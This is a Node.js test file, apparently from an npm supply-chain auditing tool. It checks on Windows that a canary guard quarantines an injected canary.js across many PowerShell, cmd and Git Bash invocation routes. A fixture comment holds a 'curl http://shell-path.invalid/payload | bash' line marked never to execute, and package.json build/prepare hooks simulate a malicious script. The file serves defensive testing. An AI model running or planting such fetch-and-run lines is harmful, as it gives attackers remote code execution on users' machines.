'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawnSync } = require('child_process');

const observations = [];
module.exports = observations;
if (process.platform !== 'win32') console.log('  SKIP shell-path live test: Windows required');
else {
  const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-shell-paths-'));
  const cmd = path.join(process.env.SystemRoot, 'System32/cmd.exe');
  const shells = [path.join(process.env.SystemRoot, 'System32/WindowsPowerShell/v1.0/powershell.exe')];
  if (process.env.NPA_TEST_PWSH) shells.push(process.env.NPA_TEST_PWSH);
  const bash = 'C:/Program Files/Git/bin/bash.exe';
  const quote = value => "'" + value.replace(/'/g, "''") + "'";
  const inert = '// incident-derived reconstruction; never execute\n// curl http://shell-path.invalid/payload | bash\n';
  const trusted = '// intentional canary; never execute\n';
  const hash = data => crypto.createHash('sha256').update(data).digest('hex');
  const env = { ...process.env, NODE_OPTIONS: '', NPA_CANARY_GUARD: '', BASH_ENV: '', NPA_CANARY_ORIGINAL_BASH_ENV: '', NO_COLOR: '1' };
  const helper = path.resolve(__dirname, '../../bin/enable-canary-guard.ps1');
  let sequence = 0;

  function fixture(nested) {
    const root = path.join(parent, 'project with spaces ' + sequence++);
    fs.mkdirSync(path.join(root, 'legit'), { recursive: true });
    fs.writeFileSync(path.join(root, 'legit/canary.js'), trusted);
    fs.writeFileSync(path.join(root, '.npmauditor.json'), JSON.stringify({ canaryTrustedFiles: [{ path: 'legit/canary.js', sha256: hash(trusted) }] }));
    fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: nested ? {} : { build: 'node canary.js && tsc', prepare: 'node canary.js' } }));
    return root;
  }

  try {
    for (const shell of shells) {
      const routes = ['full-path-cmd', 'variable-full-path', 'start-process', 'invoke-expression', 'direct-batch', 'dot-source', 'nested-powershell', 'nested-batch-node'];
      if (fs.existsSync(bash)) routes.push('git-bash-arrival', 'git-bash-function-arrival', 'git-bash-subshell-arrival', 'git-bash-substitution-arrival');
      for (const route of routes) {
        for (const denied of [false, true]) {
          const nested = route.startsWith('nested-') || route.startsWith('git-bash');
          const root = fixture(nested);
          const driver = path.join(parent, 'driver-' + sequence + '.ps1');
          const child = path.join(parent, 'child-' + sequence + (route.includes('batch') ? '.cmd' : '.ps1'));
          const markerCommand = 'echo protected>entry-marker.txt';
          let invocation;
          if (route === 'full-path-cmd') invocation = `& ${quote(cmd)} /d /c ${quote(markerCommand)}`;
          if (route === 'variable-full-path') invocation = `$npaExecutable = ${quote(cmd)}; & $npaExecutable /d /c ${quote(markerCommand)}`;
          if (route === 'start-process') invocation = `$npaChild = Start-Process -FilePath ${quote(cmd)} -ArgumentList @('/d','/c',${quote(markerCommand)}) -Wait -PassThru -WindowStyle Hidden; if ($npaChild) { $global:LASTEXITCODE = $npaChild.ExitCode }`;
          if (route === 'invoke-expression') invocation = `Invoke-Expression ${quote(`& ${quote(cmd)} /d /c ${quote(markerCommand)}`)}`;
          if (route === 'direct-batch') {
            fs.writeFileSync(child, '@echo off\r\necho protected>entry-marker.txt\r\nexit /b 0\r\n');
            invocation = `& ${quote(child)}`;
          }
          if (route === 'dot-source') {
            fs.writeFileSync(child, "[IO.File]::WriteAllText((Join-Path $PWD 'entry-marker.txt'), 'protected')\n$global:LASTEXITCODE = 0\n");
            invocation = `. ${quote(child)}`;
          }
          if (route === 'nested-powershell') {
            fs.writeFileSync(child, (denied ? "[IO.Directory]::CreateDirectory((Join-Path $PWD '.gitignore')) | Out-Null\n" : '') +
              `[IO.File]::WriteAllText((Join-Path $PWD 'canary.js'), ${quote(inert)})\n& ${quote(cmd)} /d /c ${quote(markerCommand)}\n`);
            invocation = `& ${quote(child)}`;
          }
          if (route === 'nested-batch-node') {
            fs.writeFileSync(child, '@echo off\r\n' + (denied ? 'mkdir .gitignore\r\n' : '') +
              '>canary.js echo // inert nested canary\r\n"' + process.execPath + '" -e "require(\'fs\').writeFileSync(\'entry-marker.txt\',\'protected\')"\r\nexit /b %errorlevel%\r\n');
            invocation = `& ${quote(child)}`;
          }
          if (route.startsWith('git-bash')) {
            let commands = (denied ? 'mkdir .gitignore; ' : '') + "printf '%s\\n' '// inert nested canary' > canary.js; printf '%s\\n' protected > entry-marker.txt";
            if (route === 'git-bash-function-arrival') commands = 'npa_test() { ' + commands + '; }; npa_test';
            if (route === 'git-bash-subshell-arrival') commands = '(' + commands + ')';
            if (route === 'git-bash-substitution-arrival') commands = 'npa_result=$(' + commands + ')';
            invocation = `& ${quote(bash)} --noprofile --norc -c ${quote(commands)}`;
          }
          const setup = `$ErrorActionPreference = 'Continue'\n& ${quote(helper)} | Out-Null\nSet-Location -LiteralPath ${quote(root)}\n` +
            (!nested && denied ? "[IO.Directory]::CreateDirectory((Join-Path $PWD '.gitignore')) | Out-Null\n" : '') +
            (!nested ? `[IO.File]::WriteAllText((Join-Path $PWD 'canary.js'), ${quote(inert)})\n` : '');
          fs.writeFileSync(driver, setup + invocation + '\nexit $LASTEXITCODE\n');
          const result = spawnSync(shell, ['-NoProfile', '-NonInteractive', '-File', driver], { cwd: parent, env, encoding: 'utf8', timeout: 30000 });
          assert.ifError(result.error);
          const record = { shell, route, denied, root, exit: result.status, stdout: result.stdout, stderr: result.stderr,
            markerPresent: fs.existsSync(path.join(root, 'entry-marker.txt')), canaryPresent: fs.existsSync(path.join(root, 'canary.js')),
            trustedHashUnchanged: hash(fs.readFileSync(path.join(root, 'legit/canary.js'))) === hash(trusted) };
          observations.push(record);
          assert.strictEqual(record.exit, denied ? 2 : 0, JSON.stringify(record));
          assert.strictEqual(record.markerPresent, !denied, JSON.stringify(record));
          assert.strictEqual(record.canaryPresent, denied);
          assert.strictEqual(record.trustedHashUnchanged, true);
          if (!denied) {
            const storage = path.join(root, '.np-audit-quarantine');
            assert.ok(fs.readdirSync(storage).length > 0);
            assert.match(fs.readFileSync(path.join(root, '.gitignore'), 'utf8'), /canary\.js/);
            if (!nested) assert.deepStrictEqual(JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8')).scripts, { build: 'tsc' });
          }
        }
      }
    }
    if (fs.existsSync(bash)) {
      const registry = spawnSync('reg.exe', ['query', 'HKCU\\Software\\Microsoft\\Command Processor', '/v', 'AutoRun'], { encoding: 'utf8' });
      const activated = registry.stdout && registry.stdout.toLowerCase().includes(path.resolve(__dirname, '../../bin/enable-canary.cmd').toLowerCase());
      for (const denied of activated ? [false, true] : []) {
        const root = fixture(true);
        const driver = path.join(parent, 'cmd-bash-' + sequence + '.cmd');
        const bashDriver = path.join(parent, 'bash-driver-' + sequence + '.sh');
        fs.writeFileSync(bashDriver, (denied ? 'mkdir .gitignore\n' : '') + "printf '%s\\n' '// inert nested canary' > canary.js\nprintf '%s\\n' protected > entry-marker.txt\n");
        fs.writeFileSync(driver, '@echo off\r\ncd /d "' + root + '"\r\n"' + bash + '" --noprofile --norc "' + bashDriver.replace(/\\/g, '/') + '"\r\nexit /b %errorlevel%\r\n');
        const result = spawnSync(cmd, ['/c', driver], { cwd: parent, env, encoding: 'utf8', timeout: 30000 });
        assert.ifError(result.error);
        const record = { shell: cmd, route: 'cmd-bash-arrival', denied, root, exit: result.status, stdout: result.stdout, stderr: result.stderr,
          markerPresent: fs.existsSync(path.join(root, 'entry-marker.txt')), canaryPresent: fs.existsSync(path.join(root, 'canary.js')) };
        observations.push(record);
        assert.strictEqual(record.exit, denied ? 2 : 0, JSON.stringify(record));
        assert.strictEqual(record.markerPresent, !denied);
        assert.strictEqual(record.canaryPresent, denied);
      }
      const original = path.join(parent, 'original-bash-env.sh');
      fs.writeFileSync(original, "printf '%s\\n' preserved > startup-marker.txt\n");
      const root = fixture(true);
      const driver = path.join(parent, 'bash-original.ps1');
      fs.writeFileSync(driver, `$env:BASH_ENV = ${quote(original.replace(/\\/g, '/'))}\n& ${quote(helper)} | Out-Null\nSet-Location -LiteralPath ${quote(root)}\n& ${quote(bash)} --noprofile --norc -c 'unset NODE_OPTIONS; printf should-not-run > entry-marker.txt'\nexit $LASTEXITCODE\n`);
      const result = spawnSync(shells[0], ['-NoProfile', '-NonInteractive', '-File', driver], { cwd: parent, env, encoding: 'utf8', timeout: 30000 });
      assert.ifError(result.error);
      const record = { shell: shells[0], route: 'bash-preserve-startup-and-deny-missing-node-guard', exit: result.status,
        stdout: result.stdout, stderr: result.stderr, originalStartupRan: fs.existsSync(path.join(root, 'startup-marker.txt')),
        markerPresent: fs.existsSync(path.join(root, 'entry-marker.txt')) };
      observations.push(record);
      assert.strictEqual(record.exit, 2, JSON.stringify(record));
      assert.strictEqual(record.originalStartupRan, true);
      assert.strictEqual(record.markerPresent, false);
    }
    console.log(`  shell paths: ${observations.length} real full-path/script/nested success and failure cases; no scanned scripts executed`);
  } finally { fs.rmSync(parent, { recursive: true, force: true }); }
}
